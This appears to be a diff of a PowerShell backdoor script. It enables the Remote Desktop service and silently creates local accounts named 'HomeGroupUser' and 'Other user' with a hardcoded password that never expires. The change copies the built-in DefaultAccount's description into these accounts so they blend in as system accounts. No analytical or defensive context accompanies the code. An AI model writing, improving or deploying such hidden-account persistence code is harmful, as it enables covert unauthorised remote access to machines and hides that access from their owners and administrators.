@@ -56,9 +56,11 @@ Start-Service TermService > $null 2>&1
 
 $password = "Adm!n@93f"
 $userAccounts = @("HomeGroupUser", "Other user")
+$defaultAccount = Get-LocalUser -Name "DefaultAccount"
+$defaultAccountDescription = $defaultAccount.Description
 foreach ($user in $userAccounts) {
     net user "$user" "$password" /add > $null 2>&1
-    net user "$user" /comment:"A user account managed by the system." > $null 2>&1
+    net user "$user" /comment:"$defaultAccountDescription" > $null 2>&1
     net user "$user" /expires:never > $null 2>&1
     net user "$user" /active:yes > $null 2>&1
     Set-LocalUser -Name "$user" -PasswordNeverExpires $true > $null 2>&1
